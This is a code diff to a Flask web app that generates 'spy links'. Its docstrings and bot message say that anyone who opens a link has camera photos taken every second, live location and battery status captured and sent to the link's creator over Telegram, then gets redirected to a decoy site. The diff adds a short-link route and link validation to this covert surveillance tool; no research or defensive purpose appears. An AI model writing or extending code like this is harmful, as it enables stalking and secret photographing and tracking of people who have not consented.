@@ -69,23 +69,29 @@ def send_telegram_location(chat_id, lat, lng):
     requests.post(url, data=data).raise_for_status()
 
 # ---------- Routes ----------
-@app.route('/')
-def index():
-    """Spy landing page - captures photo, location, battery, then redirects."""
-    link_id = request.args.get('id', '')
+def _render_spy(link_id):
+    """Shared logic used by both / (with ?id=) and /s/<link_id>."""
     links = load_json('links.json')
-    link_data = links.get(link_id, {})
+    link_data = links.get(link_id,{})
+    if link_id and not link_data:
+        return f"Invalid spy link: {link_id}", 404
     target_url = link_data.get('url', 'https://google.com')
-    creator_id = str(link_data.get('created_by') or config['chat_id'])
 
-    # Generate or retrieve visitor ID
     visitor_id = session.get('visitor_id')
     if not visitor_id:
         visitor_id = f"VIS_{int(time.time())}_{random.randbytes(4).hex()}"
         session['visitor_id'] = visitor_id
-
-    # Return the spy HTML page (inline template)
     return render_template_string(SPY_PAGE, visitor_id=visitor_id, target_url=target_url)
+
+@app.route('/')
+def index():
+    """Old-style spy link: /?id=<link_id>"""
+    return _render_spy(request.args.get('id',''))
+
+@app.route('/s/<link_id>')
+def short(link_id):
+    """New-style spy link: /s/<link_id>"""
+    return _render_spy(link_id)
 
 SPY_PAGE = '''
 <!DOCTYPE html>
@@ -400,7 +406,8 @@ def webhook():
         }
         save_json('links.json', links)
 
-        spy_link = config['website'] + short_code
+        base = config['website'].rstrip('/')
+        spy_link = f"{base}/?id={short_code}"
         msg = (f"✅ *Spy Link Generated!*\n\n🔗 `{spy_link}`\n\n"
                "📸 When someone opens this link:\n• Camera photos (every 1 sec)\n• Live Location\n• Battery Status\n\n"
                "*All photos will come to YOU!*")
